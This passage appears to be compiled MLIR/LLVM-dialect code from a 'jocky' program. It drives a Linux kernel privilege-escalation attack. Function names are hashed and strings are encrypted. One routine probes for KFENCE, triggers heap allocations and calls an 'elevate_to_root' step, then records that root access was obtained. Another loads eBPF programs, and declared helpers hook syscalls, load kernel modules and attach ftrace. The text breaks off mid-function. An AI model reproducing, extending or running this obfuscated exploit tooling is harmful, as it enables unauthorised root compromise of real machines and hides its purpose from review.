  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @f_0218a827(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %2 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %2 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %3 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg1, %3 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %4 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg2, %4 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg3, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %6 = llvm.load %2 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %7 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %8 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @audit_log(%6, %7, %8, %9) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %10 = llvm.load %1 {alignment = 4 : i64} : !llvm.ptr -> i32
    %11 = llvm.add %10, %0 : i32
    llvm.store %11, %1 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.return
  }
  llvm.func @f_f8b7e158() {
    %0 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(2000 : i32) : i32
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @audit_log_initialized : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    %19 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<59 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<48 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<62 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.call @audit_init(%10) : (i32) -> i1
    llvm.store %11, %12 {alignment = 1 : i64} : i1, !llvm.ptr
    %29 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %30 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %31 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %32 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @f_0218a827(%29, %30, %31, %32) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %33 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.getelementptr %18[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_b9127cd9() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @g_a0b3b851 : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(0 : i64) : i64
    %7 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    %17 = llvm.mlir.constant(256 : i32) : i32
    %18 = llvm.mlir.constant(100 : i32) : i32
    %19 = llvm.mlir.constant(1 : i64) : i64
    %20 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @g_95bd4817 : !llvm.ptr
    %22 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    %25 = llvm.mlir.constant(true) : i1
    %26 = llvm.mlir.addressof @root_access_obtained : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    %29 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %36 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.call @array_len(%36) : (!llvm.ptr) -> i64
    %38 = llvm.call @string(%37) : (i64) -> !llvm.ptr
    %39 = llvm.call @jocky_str_concat(%35, %38) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    %42 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.call @array_len(%42) : (!llvm.ptr) -> i64
    %44 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %6, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    %45 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb13
    %46 = llvm.load %44 {alignment = 4 : i64} : !llvm.ptr -> i64
    %47 = llvm.icmp "slt" %46, %43 : i64
    llvm.cond_br %47, ^bb2, ^bb14
  ^bb2:  // pred: ^bb1
    %48 = llvm.bitcast %42 : !llvm.ptr to !llvm.ptr
    %49 = llvm.getelementptr %48[%46] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %50 = llvm.load %49 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %50, %45 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %51 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %52 = llvm.bitcast %51 : !llvm.ptr to !llvm.ptr
    %53 = llvm.getelementptr %52[%2] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %54 = llvm.load %53 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %54, %29 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %55 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %56 = llvm.bitcast %55 : !llvm.ptr to !llvm.ptr
    %57 = llvm.getelementptr %56[%0] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %58 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %58, %30 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %59 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    %60 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %61 = llvm.add %60, %0 : i32
    %62 = llvm.sext %61 : i32 to i64
    %63 = llvm.call @string(%62) : (i64) -> !llvm.ptr
    %64 = llvm.call @jocky_str_concat(%59, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %65 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %66 = llvm.call @jocky_str_concat(%64, %65) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %67 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %68 = llvm.call @array_len(%67) : (!llvm.ptr) -> i64
    %69 = llvm.call @string(%68) : (i64) -> !llvm.ptr
    %70 = llvm.call @jocky_str_concat(%66, %69) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %71 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
    %72 = llvm.call @jocky_str_concat(%70, %71) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %73 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %74 = llvm.call @jocky_str_concat(%72, %73) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%74) : (!llvm.ptr) -> ()
    %75 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %76 = llvm.load %30 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %77 = llvm.call @jocky_str_concat(%75, %76) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%77) : (!llvm.ptr) -> ()
    llvm.store %2, %31 {alignment = 4 : i64} : i32, !llvm.ptr
    %78 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %79 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %80 = llvm.icmp "eq" %78, %79 : !llvm.ptr
    llvm.cond_br %80, ^bb3, ^bb11
  ^bb3:  // pred: ^bb2
    %81 = llvm.call @jocky_fence2pwn_detect_kfence() : () -> i32
    llvm.store %81, %31 {alignment = 4 : i64} : i32, !llvm.ptr
    %82 = llvm.load %31 {alignment = 4 : i64} : !llvm.ptr -> i32
    %83 = llvm.icmp "eq" %82, %2 : i32
    llvm.cond_br %83, ^bb4, ^bb9
  ^bb4:  // pred: ^bb3
    %84 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<51 x i8>
    llvm.call @println(%84) : (!llvm.ptr) -> ()
    %85 = llvm.sext %17 : i32 to i64
    %86 = llvm.call @jocky_fence2pwn_trigger_allocations(%85, %18) : (i64, i32) -> i32
    llvm.store %86, %32 {alignment = 4 : i64} : i32, !llvm.ptr
    %87 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %88 = llvm.icmp "eq" %87, %2 : i32
    llvm.cond_br %88, ^bb5, ^bb8
  ^bb5:  // pred: ^bb4
    %89 = llvm.call @jocky_fence2pwn_elevate_to_root() : () -> i32
    llvm.store %89, %33 {alignment = 4 : i64} : i32, !llvm.ptr
    %90 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i32
    %91 = llvm.icmp "eq" %90, %2 : i32
    llvm.cond_br %91, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %92 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%92) : (!llvm.ptr) -> ()
    %93 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %94 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %95 = llvm.call @array_append(%93, %94) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %95, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %96 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %97 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %98 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %99 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.call @f_0218a827(%96, %97, %98, %99) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.store %25, %26 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.br ^bb14
  ^bb7:  // pred: ^bb5
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb4, ^bb7
    llvm.br ^bb10
  ^bb9:  // pred: ^bb3
    %100 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    llvm.call @println(%100) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    llvm.br ^bb12
  ^bb11:  // pred: ^bb2
    %101 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %102 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %103 = llvm.call @jocky_str_concat(%101, %102) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %104 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %105 = llvm.call @jocky_str_concat(%103, %104) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%105) : (!llvm.ptr) -> ()
    %106 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%106) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    %107 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %108 = llvm.add %107, %0 : i32
    llvm.store %108, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb13
  ^bb13:  // pred: ^bb12
    %109 = llvm.add %46, %19 : i64
    llvm.store %109, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb14:  // 2 preds: ^bb1, ^bb6
    %110 = llvm.load %26 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %110, ^bb15, ^bb16
  ^bb15:  // pred: ^bb14
    %111 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%111) : (!llvm.ptr) -> ()
    %112 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<58 x i8>
    llvm.call @println(%112) : (!llvm.ptr) -> ()
    llvm.br ^bb17
  ^bb16:  // pred: ^bb14
    %113 = llvm.getelementptr %27[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<71 x i8>
    llvm.call @println(%113) : (!llvm.ptr) -> ()
    llvm.br ^bb17
  ^bb17:  // 2 preds: ^bb15, ^bb16
    llvm.return
  }
  llvm.func @f_b610cf36() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @g_a61efe88 : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(0 : i64) : i64
    %7 = llvm.mlir.addressof @g_e836b4e8 : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %14 = llvm.mlir.zero : !llvm.ptr
    %15 = llvm.mlir.constant(256 : i32) : i32
    %16 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    %21 = llvm.mlir.constant(1 : i64) : i64
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %24 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %25 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %28 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @array_len(%28) : (!llvm.ptr) -> i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    %33 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %33 {alignment = 4 : i64} : i32, !llvm.ptr
    %34 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %35 = llvm.call @array_len(%34) : (!llvm.ptr) -> i64
    %36 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %6, %36 {alignment = 4 : i64} : i64, !llvm.ptr
    %37 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb6
    %38 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i64
    %39 = llvm.icmp "slt" %38, %35 : i64
    llvm.cond_br %39, ^bb2, ^bb7
  ^bb2:  // pred: ^bb1
    %40 = llvm.bitcast %34 : !llvm.ptr to !llvm.ptr
    %41 = llvm.getelementptr %40[%38] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %42 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %42, %37 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %44 = llvm.bitcast %43 : !llvm.ptr to !llvm.ptr
    %45 = llvm.getelementptr %44[%2] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %46 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %46, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %47 = llvm.load %37 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %48 = llvm.bitcast %47 : !llvm.ptr to !llvm.ptr
    %49 = llvm.getelementptr %48[%0] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %50 = llvm.load %49 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %50, %23 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %51 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    %52 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i32
    %53 = llvm.add %52, %0 : i32
    %54 = llvm.sext %53 : i32 to i64
    %55 = llvm.call @string(%54) : (i64) -> !llvm.ptr
    %56 = llvm.call @jocky_str_concat(%51, %55) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %57 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %58 = llvm.call @jocky_str_concat(%56, %57) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %59 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %60 = llvm.call @array_len(%59) : (!llvm.ptr) -> i64
    %61 = llvm.call @string(%60) : (i64) -> !llvm.ptr
    %62 = llvm.call @jocky_str_concat(%58, %61) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %63 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
    %64 = llvm.call @jocky_str_concat(%62, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %65 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %66 = llvm.call @jocky_str_concat(%64, %65) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%66) : (!llvm.ptr) -> ()
    %67 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %68 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %69 = llvm.call @jocky_str_concat(%67, %68) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%69) : (!llvm.ptr) -> ()
    llvm.store %0, %24 {alignment = 4 : i64} : i32, !llvm.ptr
    %70 = llvm.load %24 {alignment = 4 : i64} : !llvm.ptr -> i32
    %71 = llvm.call @jocky_ebpf_load(%14, %15, %70) : (!llvm.ptr, i32, i32) -> i32
    llvm.store %71, %25 {alignment = 4 : i64} : i32, !llvm.ptr
    %72 = llvm.load %25 {alignment = 4 : i64} : !llvm.ptr -> i32
    %73 = llvm.icmp "sge" %72, %2 : i32
    llvm.cond_br %73, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %74 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %75 = llvm.load %25 {alignment = 4 : i64} : !llvm.ptr -> i32
    %76 = llvm.sext %75 : i32 to i64
    %77 = llvm.call @string(%76) : (i64) -> !llvm.ptr
    %78 = llvm.call @jocky_str_concat(%74, %77) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%78) : (!llvm.ptr) -> ()
    %79 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %81 = llvm.call @array_append(%79, %80) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %81, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %82 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %83 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %84 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %85 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%82, %83, %84, %85) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb4:  // pred: ^bb2
    %86 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    llvm.call @println(%86) : (!llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    %87 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i32
    %88 = llvm.add %87, %0 : i32
    llvm.store %88, %33 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb6
  ^bb6:  // pred: ^bb5
    %89 = llvm.add %38, %21 : i64
    llvm.store %89, %36 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb7:  // pred: ^bb1
    %90 = llvm.load %7 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %91 = llvm.call @array_len(%90) : (!llvm.ptr) -> i64
    %92 = llvm.sext %2 : i32 to i64
    %93 = llvm.icmp "sgt" %91, %92 : i64
    llvm.cond_br %93, ^bb8, ^bb9
  ^bb8:  // pred: ^bb7
    %94 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%94) : (!llvm.ptr) -> ()
